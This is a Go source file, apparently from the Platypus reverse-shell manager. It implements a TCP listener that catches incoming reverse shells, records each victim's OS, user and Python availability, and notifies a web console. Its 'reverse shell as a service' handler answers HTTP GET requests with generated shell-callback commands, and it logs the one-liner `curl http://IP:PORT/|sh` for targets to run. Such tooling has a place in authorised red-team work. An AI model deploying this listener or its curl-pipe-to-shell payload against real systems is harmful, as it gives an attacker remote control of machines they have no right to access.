package context

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/lib/util/hash"
	"github.com/WangYihang/Platypus/lib/util/log"
	"github.com/WangYihang/Platypus/lib/util/raas"
	humanize "github.com/dustin/go-humanize"
	"github.com/jedib0t/go-pretty/table"
)

type WebSocketMessage struct {
	Type WebSocketMessageType
	Data interface{}
}
type TCPServer struct {
	Host          string                  `json:"host"`
	GroupDispatch bool                    `json:"group_dispatch"`
	Port          uint16                  `json:"port"`
	Clients       map[string](*TCPClient) `json:"clients"`
	TimeStamp     time.Time               `json:"timestamp"`
	Interfaces    []string                `json:"interfaces"`
	Hash          string                  `json:"hash"`
	hashFormat    string
	stopped       chan struct{}
}

func CreateTCPServer(host string, port uint16, hashFormat string) *TCPServer {
	service := fmt.Sprintf("%s:%d", host, port)

	if Ctx.Servers[hash.MD5(service)] != nil {
		log.Error("The server (%s) already exists", service)
		return nil
	}

	// Default hashFormat
	if hashFormat == "" {
		hashFormat = "%i %u %m %o %t"
	}

	tcpServer := &TCPServer{
		Host:          host,
		Port:          port,
		GroupDispatch: true,
		Clients:       make(map[string](*TCPClient)),
		Interfaces:    []string{},
		TimeStamp:     time.Now(),
		hashFormat:    hashFormat,
		Hash:          hash.MD5(fmt.Sprintf("%s:%d", host, port)),
		stopped:       make(chan struct{}, 1),
	}
	Ctx.Servers[hash.MD5(service)] = tcpServer

	// Add help information of RaaS
	// eg: curl http://[IP]:[PORT]/ | sh
	if net.ParseIP(tcpServer.Host).IsUnspecified() {
		// tcpServer.Host is unspecified
		// eg: "0.0.0.0", "[::]"
		ifaces, _ := net.Interfaces()
		for _, i := range ifaces {
			addrs, _ := i.Addrs()
			for _, addr := range addrs {
				switch v := addr.(type) {
				case *net.IPNet:
					// ipv4
					if addr.(*net.IPNet).IP.To4() != nil {
						tcpServer.Interfaces = append(tcpServer.Interfaces, v.IP.String())
						break
					}
					// ipv6 is not used currently
					// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, tcpServer.Port)
				}
			}
		}
	} else {
		tcpServer.Interfaces = append(tcpServer.Interfaces, host)
	}

	// Try to check
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Debug("Check Resolve TCP address failed: %s", err)
		Ctx.DeleteServer(tcpServer)
		return nil
	}
	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		log.Debug("Check Listen failed: %s", err)
		Ctx.DeleteServer(tcpServer)
		return nil
	} else {
		listener.Close()
	}

	return tcpServer
}

func (s *TCPServer) Handle(conn net.Conn) {
	client := CreateTCPClient(conn)
	log.Info("A new income connection from %s", client.conn.RemoteAddr())
	// Reverse shell as a service
	buffer := make([]byte, 4)
	client.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
	client.readLock.Lock()
	n, err := client.conn.Read(buffer)
	client.readLock.Unlock()
	client.conn.SetReadDeadline(time.Time{})
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			log.Debug("Not requesting for service")
		} else {
			client.Close()
		}
	}
	if string(buffer[:n]) == "GET " {
		requestURI := client.ReadUntilClean(" ")
		// Read HTTP Version
		client.ReadUntilClean("\r\n")
		httpHost := fmt.Sprintf("%s:%d", s.Host, s.Port)
		for {
			var line = client.ReadUntilClean("\r\n")
			// End of headers
			if line == "" {
				log.Debug("All header read")
				break
			}
			delimiter := ":"
			index := strings.Index(line, delimiter)
			headerKey := line[:index]
			headerValue := strings.Trim(line[index+len(delimiter):], " ")
			if headerKey == "Host" {
				httpHost = headerValue
			}
		}
		command := fmt.Sprintf("%s\n", raas.URI2Command(requestURI, httpHost))
		client.Write([]byte("HTTP/1.0 200 OK\r\n"))
		client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
		client.Write([]byte("\r\n"))
		client.Write([]byte(command))
		client.Close()
		log.Info("A RaaS request from %s served", client.conn.RemoteAddr().String())
	} else {
		s.AddTCPClient(client)
	}
}

func (s *TCPServer) Run() {
	service := fmt.Sprintf("%s:%d", s.Host, s.Port)
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}
	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		log.Error("Listen failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}
	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))

	for _, ifname := range s.Interfaces {
		log.Warn("\t`curl http://%s:%d/|sh`", ifname, s.Port)
	}

	for {
		select {
		case <-s.stopped:
			listener.Close()
			return
		default:
			var err error
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			go s.Handle(conn)
		}
	}
}

func (s *TCPServer) AsTable() {
	if len(s.Clients) > 0 {
		t := table.NewWriter()
		t.SetOutputMirror(os.Stdout)
		t.SetTitle(fmt.Sprintf(
			"%s is listening on %s:%d, %d clients",
			s.Hash,
			(*s).Host,
			(*s).Port,
			len((*s).Clients),
		))

		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Python", "Time", "Alias", "GroupDispatch"})

		for chash, client := range s.Clients {
			t.AppendRow([]interface{}{
				chash,
				client.conn.RemoteAddr().String(),
				client.OS.String(),
				client.User,
				client.Python2 != "" || client.Python3 != "",
				humanize.Time(client.TimeStamp),
				client.Alias,
				client.GroupDispatch,
			})

		}
		t.Render()
		log.Success(fmt.Sprintf(
			"%s is listening on %s:%d, %d clients listed",
			s.Hash,
			(*s).Host,
			(*s).Port,
			len((*s).Clients),
		))
	} else {
		log.Warn(fmt.Sprintf(
			"[%s] is listening on %s:%d, 0 clients",
			s.Hash,
			(*s).Host,
			(*s).Port,
		))
	}
}

func (s *TCPServer) OnelineDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"%s:%d (%d online clients)",
			s.Host,
			s.Port,
			len(s.Clients),
		),
	)
	return buffer.String()
}

func (s *TCPServer) FullDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"[%s] %s:%d (%d online clients) (started at: %s)",
			s.Hash,
			s.Host,
			s.Port,
			len(s.Clients),
			humanize.Time(s.TimeStamp),
		),
	)
	var descs []string
	for _, client := range s.Clients {
		descs = append(descs, fmt.Sprintf("\t%s", client.FullDesc()))
	}
	if len(descs) > 0 {
		buffer.WriteString("\n")
	}
	buffer.WriteString(strings.Join(descs, "\n"))
	return buffer.String()
}

func (s *TCPServer) Stop() {
	log.Info(fmt.Sprintf("Stopping server: %s", s.OnelineDesc()))
	s.stopped <- struct{}{}

	// Connect to the listener, in order to call listener.Close() immediately
	// ???
	go func() {
		tmp, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", s.Host, s.Port))
		if tmp != nil {
			tmp.Close()
		}
	}()

	for _, client := range s.Clients {
		s.DeleteTCPClient(client)
	}
}

type WebSocketMessageType int

const (
	CLIENT_CONNECTED WebSocketMessageType = iota
	CLIENT_DUPLICATED
	SERVER_DUPLICATED
)

func (s *TCPServer) AddTCPClient(client *TCPClient) {
	client.GroupDispatch = s.GroupDispatch
	client.GatherClientInfo(s.hashFormat)
	if _, exists := s.Clients[client.Hash]; exists {
		log.Error("Duplicated income connection detected!")
		// WebSocket Broadcast
		type ClientDuplicateMessage struct {
			Client     TCPClient
			ServerHash string
		}
		msg, _ := json.Marshal(WebSocketMessage{
			Type: CLIENT_DUPLICATED, // 0 for client online
			Data: ClientDuplicateMessage{
				Client:     *client,
				ServerHash: s.Hash,
			},
		})
		// Notify to all websocket clients
		Ctx.NotifyWebSocket.Broadcast(msg)
		client.Close()
	} else {
		log.Success("Fire in the hole: %s", client.OnelineDesc())
		s.Clients[client.Hash] = client
		// WebSocket Broadcast
		type ClientOnlineMessage struct {
			Client     TCPClient
			ServerHash string
		}
		msg, _ := json.Marshal(WebSocketMessage{
			Type: CLIENT_CONNECTED, // 0 for client online
			Data: ClientOnlineMessage{
				Client:     *client,
				ServerHash: s.Hash,
			},
		})
		// Notify to all websocket clients
		Ctx.NotifyWebSocket.Broadcast(msg)
	}
}

func (s *TCPServer) DeleteTCPClient(client *TCPClient) {
	delete(s.Clients, client.Hash)
	client.Close()
}

func (s *TCPServer) GetAllTCPClients() map[string](*TCPClient) {
	return s.Clients
}
